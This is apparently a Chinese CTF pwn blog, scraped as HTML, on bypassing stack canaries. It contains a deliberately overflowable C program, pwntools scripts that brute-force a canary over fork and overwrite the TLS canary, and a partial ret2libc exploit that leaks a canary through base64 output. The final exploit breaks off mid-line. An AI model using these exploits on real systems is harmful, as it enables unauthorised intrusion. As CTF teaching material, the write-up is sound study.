<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">getflag</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> flag[<span class="number">100</span>];</span><br><span class="line">    FILE *fp = fopen(<span class="string">&quot;./flag&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (fp == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;get flag error&quot;</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;   </span><br><span class="line">    fgets(flag, <span class="number">100</span>, fp);</span><br><span class="line">    <span class="built_in">puts</span>(flag);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    setbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>);</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line">    setbuf(<span class="built_in">stderr</span>, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">fun</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buffer[<span class="number">100</span>];</span><br><span class="line">    read(STDIN_FILENO, buffer, <span class="number">120</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    init();</span><br><span class="line">	<span class="keyword">pid_t</span> pid;</span><br><span class="line">	<span class="keyword">while</span>(<span class="number">1</span>) &#123;</span><br><span class="line">		pid = fork();		<span class="comment">//fork开启子进程</span></span><br><span class="line">		<span class="keyword">if</span>(pid &lt; <span class="number">0</span>) &#123;</span><br><span class="line">			<span class="built_in">puts</span>(<span class="string">&quot;fork error&quot;</span>);</span><br><span class="line">			<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span>(pid == <span class="number">0</span>) &#123;</span><br><span class="line">			<span class="built_in">puts</span>(<span class="string">&quot;welcome&quot;</span>);</span><br><span class="line">			fun();</span><br><span class="line">			<span class="built_in">puts</span>(<span class="string">&quot;recv sucess&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> &#123;</span><br><span class="line">			wait(<span class="number">0</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">cn = process(<span class="string">&#x27;./bin&#x27;</span>)</span><br><span class="line">padding = <span class="string">&#x27;a&#x27;</span>*<span class="number">100</span></span><br><span class="line"></span><br><span class="line">cn.recvuntil(<span class="string">&#x27;welcome\n&#x27;</span>)</span><br><span class="line">canary = <span class="string">&#x27;\x00&#x27;</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>): </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x100</span>):</span><br><span class="line">        cn.send( padding + canary + <span class="built_in">chr</span>(i)) </span><br><span class="line">        a = cn.recvuntil(<span class="string">&#x27;welcome\n&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;recv&#x27;</span> <span class="keyword">in</span> a:	</span><br><span class="line">            canary += <span class="built_in">chr</span>(i)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">cn.sendline(<span class="string">&#x27;a&#x27;</span>*<span class="number">100</span> + canary + <span class="string">&#x27;a&#x27;</span>*<span class="number">12</span> + p32(<span class="number">0x0804864d</span>))</span><br><span class="line"></span><br><span class="line">flag = cn.recv()</span><br><span class="line">cn.close()</span><br><span class="line">log.success(<span class="string">&#x27;flag is:&#x27;</span> + flag)</span><br><span class="line"><span class="comment">#32位为‘3’,64位为‘7’</span></span><br></pre></td></tr></table></figure>
<p>这个模板可以说是经典了，遇到此类题目后改一改就好了</p>
<h2 id="覆盖TLS中储存的canary值"><a href="#覆盖TLS中储存的canary值" class="headerlink" title="覆盖TLS中储存的canary值"></a>覆盖TLS中储存的canary值</h2><p>canary的值存储在fs:[0x28]中</p>
<p>fs寄存器是由glibc定义的，存放Thread Local Storage （TLS）信息</p>
<p>该结构体如下所示：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">        <span class="keyword">void</span> *tcb;        <span class="comment">/* Pointer to the TCB.  Not necessarily the</span></span><br><span class="line"><span class="comment">                             thread descriptor used by libpthread.  */</span></span><br><span class="line">        <span class="keyword">dtv_t</span> *dtv;</span><br><span class="line">        <span class="keyword">void</span> *self;        <span class="comment">/* Pointer to the thread descriptor.  */</span></span><br><span class="line">        <span class="keyword">int</span> multiple_threads;</span><br><span class="line">        <span class="keyword">int</span> gscope_flag;</span><br><span class="line">        <span class="keyword">uintptr_t</span> sysinfo;</span><br><span class="line">        <span class="keyword">uintptr_t</span> stack_guard;   <span class="comment">/* canary，0x28偏移 */</span></span><br><span class="line">        <span class="keyword">uintptr_t</span> pointer_guard;</span><br><span class="line">        ……</span><br><span class="line">&#125; <span class="keyword">tcbhead_t</span>;</span><br></pre></td></tr></table></figure>
<p>这个 <strong>stack_guard</strong> 是在 <strong>libc_start_main</strong> 中进行设置和赋值的</p>
<p>一般来说，我们不知道TLS的位置，需要爆破脚本来找出：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">offset=<span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    p = process(<span class="string">&#x27;./xxxx&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;xxxx&quot;</span>)</span><br><span class="line">    payload = <span class="string">&#x27;&#x27;</span>				   </span><br><span class="line">    payload += (padding-<span class="number">8</span>)	 	     <span class="comment">#padding</span></span><br><span class="line">    payload += <span class="string">&#x27;aaaaaaaa&#x27;</span>		     <span class="comment">#fake canary </span></span><br><span class="line">    payload += p64(<span class="number">0xdeadbeef</span>)		 <span class="comment">#rbp</span></span><br><span class="line">    payload += p64(<span class="number">0</span>)			    <span class="comment">#返回地址</span></span><br><span class="line">    payload += <span class="string">&#x27;a&#x27;</span>*(offset-<span class="built_in">len</span>(payload))</span><br><span class="line">    p.send(payload)</span><br><span class="line">    temp = p.recvall()</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;xxxx&quot;</span> <span class="keyword">in</span> temp:</span><br><span class="line">        <span class="built_in">print</span>(offset)</span><br><span class="line">        p.close()</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        offset += <span class="number">1</span></span><br><span class="line">        p.close()</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">原本程序覆盖了canary是一定会报错的，但是payload后续填入的“a”可能会覆盖TLS，使程序通过canary</span></span><br><span class="line"><span class="string">只要程序通过了canary，‘p.recvall()’就会不接受到报错信息（stack_chk_fail）</span></span><br><span class="line"><span class="string">这之后我们就可以通过打印出的offset来计算偏移了</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span><span class="string">&quot;</span></span><br></pre></td></tr></table></figure>
<p>当然也可以不找偏移，直接一次性填入非常长的“a”也是可以覆盖的</p>
<p>覆盖TLS的方法只能在有“pthread_create”的题中可以用用，不然程序就很可能会覆盖关键数据，然后直接挂掉</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/01/04/canary%E7%88%86%E7%A0%B4%E6%9C%AA%E9%81%82+%E6%95%B0%E6%8D%AE%E6%8E%A5%E6%94%B6%E6%8A%80%E5%B7%A7/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/01/04/canary%E7%88%86%E7%A0%B4%E6%9C%AA%E9%81%82+%E6%95%B0%E6%8D%AE%E6%8E%A5%E6%94%B6%E6%8A%80%E5%B7%A7/" class="post-title-link" itemprop="url">canary爆破未遂+数据接收技巧</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2022-01-04 22:03:51" itemprop="dateCreated datePublished" datetime="2022-01-04T22:03:51+08:00">2022-01-04</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2022-01-05 20:22:32" itemprop="dateModified" datetime="2022-01-05T20:22:32+08:00">2022-01-05</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Pwn-train/" itemprop="url" rel="index"><span itemprop="name">Pwn train</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>6.7k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>6 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>今天遇到一个题目，有canary并且在循环中用fork生成子进程，当时想都没有想就开始canary爆破，仔细分析代码后才发现出题人的阴险，先用fork引诱我进行canary爆破，等我把爆破脚本写好了再搞我一手，我现在真的怀疑这人是学社工的</p>
<p>通过学习其他大佬的WP，我了解到了一种新的接受数据的方式</p>
<p>这种方式在程序使用“printf”进行输出的时候还挺好用的</p>
<hr>
<p><strong>canary爆破未遂+数据接收技巧</strong></p>
<p><img src="/2022/01/04/canary%E7%88%86%E7%A0%B4%E6%9C%AA%E9%81%82+%E6%95%B0%E6%8D%AE%E6%8E%A5%E6%94%B6%E6%8A%80%E5%B7%A7/1641288175862.png" alt="1641288175862">  </p>
<p>循环输入</p>
<p><img src="/2022/01/04/canary%E7%88%86%E7%A0%B4%E6%9C%AA%E9%81%82+%E6%95%B0%E6%8D%AE%E6%8E%A5%E6%94%B6%E6%8A%80%E5%B7%A7/1641287256715.png" alt="1641287256715"> </p>
<p><img src="/2022/01/04/canary%E7%88%86%E7%A0%B4%E6%9C%AA%E9%81%82+%E6%95%B0%E6%8D%AE%E6%8E%A5%E6%94%B6%E6%8A%80%E5%B7%A7/1641287265290.png" alt="1641287265290"> </p>
<p>32位，dynamically，开了NX，开了canary</p>
<p><img src="/2022/01/04/canary%E7%88%86%E7%A0%B4%E6%9C%AA%E9%81%82+%E6%95%B0%E6%8D%AE%E6%8E%A5%E6%94%B6%E6%8A%80%E5%B7%A7/1641288063874.png" alt="1641288063874"> </p>
<p><img src="/2022/01/04/canary%E7%88%86%E7%A0%B4%E6%9C%AA%E9%81%82+%E6%95%B0%E6%8D%AE%E6%8E%A5%E6%94%B6%E6%8A%80%E5%B7%A7/1641288075846.png" alt="1641288075846"> </p>
<p><img src="/2022/01/04/canary%E7%88%86%E7%A0%B4%E6%9C%AA%E9%81%82+%E6%95%B0%E6%8D%AE%E6%8E%A5%E6%94%B6%E6%8A%80%E5%B7%A7/1641288084647.png" alt="1641288084647"> </p>
<p><strong>代码分析</strong></p>
<p>getchar接受到“Y”后程序继续执行，然后getchar接收“Y”之后的字符（防止溢出）</p>
<p>fork函数执行以后，程序就把它自己复制了一遍，并且优先执行新进程</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>）在父进程中，fork返回新创建子进程的进程ID</span><br><span class="line"><span class="number">2</span>）在子进程中，fork返回<span class="number">0</span></span><br><span class="line"><span class="number">3</span>）如果出现错误，fork返回一个负值</span><br></pre></td></tr></table></figure>
<p>也就是说，返回“0”的子进程会进入函数“sub_8048B29”，而父进程不会</p>
<p>父进程会进行循环，源源不断地产生子进程</p>
<p>参考：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/love-jelly-pig/p/8471206.html">fork()函数详解</a></p>
<p><img src="/2022/01/04/canary%E7%88%86%E7%A0%B4%E6%9C%AA%E9%81%82+%E6%95%B0%E6%8D%AE%E6%8E%A5%E6%94%B6%E6%8A%80%E5%B7%A7/1641289340337.png" alt="1641289340337"> </p>
<p>子进程会触发函数“read”，输入“0x200”字节到“malloc”分配的空间“buf”</p>
<p><img src="/2022/01/04/canary%E7%88%86%E7%A0%B4%E6%9C%AA%E9%81%82+%E6%95%B0%E6%8D%AE%E6%8E%A5%E6%94%B6%E6%8A%80%E5%B7%A7/1641289574670.png" alt="1641289574670"> </p>
<p>for循环会一直增加“i”的值，直到条件成立，然后“buf[i]”会被赋值为“0”</p>
<p>并且“i”必须为“4”的倍数（包括“0”）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">    data = i &amp; <span class="number">3</span></span><br><span class="line">    <span class="built_in">print</span>(data)</span><br></pre></td></tr></table></figure>
<p>把“buf”赋值给“dest”后返回“1”，后面就是一个算法，通过一系列的位移操作使四个变成三个字符</p>
<p>​        // 其实就是base64加密</p>
<p><strong>入侵思路</strong></p>
<p><img src="/2022/01/04/canary%E7%88%86%E7%A0%B4%E6%9C%AA%E9%81%82+%E6%95%B0%E6%8D%AE%E6%8E%A5%E6%94%B6%E6%8A%80%E5%B7%A7/1641290228902.png" alt="1641290228902"> </p>
<p><img src="/2022/01/04/canary%E7%88%86%E7%A0%B4%E6%9C%AA%E9%81%82+%E6%95%B0%E6%8D%AE%E6%8E%A5%E6%94%B6%E6%8A%80%E5%B7%A7/1641291871253.png" alt="1641291871253"> </p>
<p>“buf”和“dest”都在堆中，那么溢出点在那里呢？</p>
<p><img src="/2022/01/04/canary%E7%88%86%E7%A0%B4%E6%9C%AA%E9%81%82+%E6%95%B0%E6%8D%AE%E6%8E%A5%E6%94%B6%E6%8A%80%E5%B7%A7/1641292428016.png" alt="1641292428016"> </p>
<p><img src="/2022/01/04/canary%E7%88%86%E7%A0%B4%E6%9C%AA%E9%81%82+%E6%95%B0%E6%8D%AE%E6%8E%A5%E6%94%B6%E6%8A%80%E5%B7%A7/1641292662924.png" alt="1641292662924"> </p>
<p>程序把“dest”进行加密，赋值给“v21”了</p>
<p>“dest”可以装“0x200”字节，而“v21”只能装“258”字节，计算得溢出了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x200</span> * <span class="number">3</span> / <span class="number">4</span> = <span class="number">384</span> &gt; <span class="number">269</span> <span class="comment">#在IDA上看的偏移  </span></span><br></pre></td></tr></table></figure>
<p>接下来就是考虑泄露Canary</p>
<p>一般程序涉及到“进程”和“线程”的时候，就会出现两种对应的canary绕过手段，前者为“canary爆破”，后者为“覆盖TLS”，这里使用前者</p>
<p>因为函数“fork”产生的字进程完全克隆父进程，canary也一样，所以这里可以采用canary爆破的方式，一字节一字节爆破canary</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>): <span class="comment">#32位为‘3’,64位为‘7’</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x100</span>):</span><br><span class="line">        p.send( padding + canary + <span class="built_in">chr</span>(i)) <span class="comment">#从0~0xFF，依次注入</span></span><br><span class="line">        a = p.recvuntil(<span class="string">&#x27;xxxx&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;xxxx&#x27;</span> <span class="keyword">in</span> a: </span><br><span class="line">            canary += <span class="built_in">chr</span>(i)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
<p>重点就是这个“xxxx”写什么，程序的输出就只有这3种情况：</p>
<p>1.子进程正常结束：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">May be I can know <span class="keyword">if</span> you give me some data[Y/N]</span><br><span class="line">Y</span><br><span class="line">Give me some datas:</span><br><span class="line"></span><br><span class="line"><span class="number">1233</span></span><br><span class="line">Result <span class="keyword">is</span>:�m�</span><br><span class="line">Finish!</span><br><span class="line"></span><br><span class="line">May be I can know <span class="keyword">if</span> you give me some data[Y/N]</span><br></pre></td></tr></table></figure>
<p>2.子进程触发canary：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">May be I can know <span class="keyword">if</span> you give me some data[Y/N]</span><br><span class="line">Y</span><br><span class="line">Give me some datas:</span><br><span class="line"></span><br><span class="line">bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb</span><br><span class="line">Result <span class="keyword">is</span>:m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m�ۻ��<span class="number">4</span>�</span><br><span class="line">*** stack smashing detected ***: terminated</span><br><span class="line"></span><br><span class="line">May be I can know <span class="keyword">if</span> you give me some data[Y/N]</span><br></pre></td></tr></table></figure>
<p>3.子进程报错：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">May be I can know <span class="keyword">if</span> you give me some data[Y/N]</span><br><span class="line">Y</span><br><span class="line">Give me some datas:</span><br><span class="line"></span><br><span class="line">bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb</span><br><span class="line">Something <span class="keyword">is</span> wrong</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">May be I can know <span class="keyword">if</span> you give me some data[Y/N]</span><br></pre></td></tr></table></figure>
<p>总结归纳一下：</p>
<p>接收字符串中有“Finish”：当前字符串正确</p>
<p>接收字符串中有“wrong”：程序长度不对</p>
<p>不管canary是否正确，只要长度不对，程序就会输出一样的东西，这一点完美卡死了canary爆破，后来发现canary可以用“覆盖低字节的方式”打印出来（”\n”覆盖”\x00”，这里是printf，所以不覆盖也可以）</p>
<p>​        // 原本想用新学的canary爆破练练手，没想到被出题人制裁了</p>
<p>这采用常规接收数据的方式：（直接计算）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">p.recvuntil(<span class="string">&quot;Give me some datas:\n&quot;</span>) <span class="comment">#这里必须加&quot;\n&quot;</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="built_in">int</span>(<span class="number">258</span>*<span class="number">4</span>/<span class="number">3</span>)</span><br><span class="line">p.sendine(payload)</span><br><span class="line">p.recvline() <span class="comment">#接收了&#x27;\n&#x27;（&#x27;\n&#x27;用printf打印出来的时候占一整排，用recvline接收正好）</span></span><br><span class="line">canary =p.recv()[<span class="number">268</span>:<span class="number">271</span>] <span class="comment">#len(&#x27;Result is:&#x27;)+258，接收3字节（没有&quot;\x00&quot;）</span></span><br><span class="line">canary=<span class="string">&quot;\x00&quot;</span>+canary</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;canary &gt;&gt; &quot;</span> +canary)</span><br></pre></td></tr></table></figure>
<p>还有一种更骚的操作：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">p.recvuntil(<span class="string">&quot;Give me some datas:&quot;</span>) <span class="comment">#这里可以不加&quot;\n&quot;</span></span><br><span class="line">payload=  base64.b64encode(<span class="string">&#x27;A&#x27;</span>*<span class="number">258</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"><span class="built_in">print</span>(p.recv())	<span class="comment">#输出接收到的数据</span></span><br><span class="line">recv= p.recv()</span><br><span class="line">canary = <span class="string">&#x27;\x00&#x27;</span>+recv[recv.rfind(<span class="string">&#x27;AAAAAA&#x27;</span>)+<span class="number">6</span>:recv.rfind(<span class="string">&#x27;AAAAAA&#x27;</span>)+<span class="number">9</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;canary &gt;&gt; &quot;</span> +canary) <span class="comment">#rfind()返回字符串最后一次出现的位置</span></span><br></pre></td></tr></table></figure>
<p>我目前还不能理解这种收集数据的方式，但是它看起来还挺实用的，以后再研究</p>
<p>本题是给了libc库的，所以这么打：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line"><span class="keyword">import</span> binascii     </span><br><span class="line"><span class="keyword">import</span> base64  </span><br><span class="line">p=process(<span class="string">&#x27;./pwns&#x27;</span>)</span><br><span class="line">libc= ELF(<span class="string">&#x27;/lib/i386-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwns&#x27;</span>)</span><br><span class="line">context(arch=<span class="string">&#x27;i386&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">setbuf_got= elf.got[<span class="string">&#x27;setbuf&#x27;</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>] </span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;May be I can know if you give me some data[Y/N]&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;Y&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Give me some datas:\n&quot;</span>) <span class="comment">#注意：这里要多收集一个&quot;\n&quot;</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="built_in">int</span>(<span class="number">258</span>*<span class="number">4</span>/<span class="number">3</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvline() </span><br><span class="line">canary =p.recv()[<span class="number">268</span>:<span class="number">271</span>] </span><br><span class="line">canary=<span class="string">&quot;\x00&quot;</span>+canary</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;canary &gt;&gt; &quot;</span> +canary)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;May be I can know if you give me some data[Y/N]&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;Y&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Give me some datas:&quot;</span>)</span><br><span class="line">payload = base64.b64encode(<span class="string">&#x27;A&#x27;</span>*<span class="number">257</span>+canary+<span class="string">&#x27;A&#x27;</span>*<span class="number">12</span>+p32(puts_plt)+<span 